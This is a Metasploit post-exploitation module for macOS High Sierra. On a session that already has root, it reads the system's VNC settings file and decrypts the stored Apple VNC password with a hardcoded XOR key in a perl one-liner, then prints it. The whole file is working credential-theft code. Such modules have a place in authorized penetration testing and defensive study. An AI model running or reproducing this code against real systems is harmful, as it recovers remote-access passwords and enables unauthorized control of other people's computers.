##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::OSX::Priv
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OS X Display Apple VNC Password',
        'Description'   => %q{
            This module show Apple VNC Password from Mac OS X High Sierra.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Kevin Gonzalvo <interhack[at]gmail.com>'],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ "meterpreter", "shell" ]
      ))

  end

  def run
    case session.type
    when /meterpreter/
      host = sysinfo["Computer"]
    when /shell/
      host = cmd_exec("hostname")
    end

    print_status("Running module against #{host}")

    unless is_root?
      fail_with(Failure::NoAccess, 'It is necessary to be root!')
    end
    print_status("This session is running as root!")

    print_status("Checking VNC Password...")
    vncsettings_path = '/Library/Preferences/com.apple.VNCSettings.txt'
    if file_exist? vncsettings_path
      password = cmd_exec("cat #{vncsettings_path} | perl -wne 'BEGIN { @k = unpack \"C*\", pack \"H*\", \"1734516E8BA8C5E2FF1C39567390ADCA\"}; chomp; @p = unpack \"C*\", pack \"H*\", $_; foreach (@k) { printf\"%c\", $_ ^ (shift @p || 0) };'")
      print_good("Password Found: #{password}")
    else
      print_error("The VNC Password has not been found")
    end
  end
end
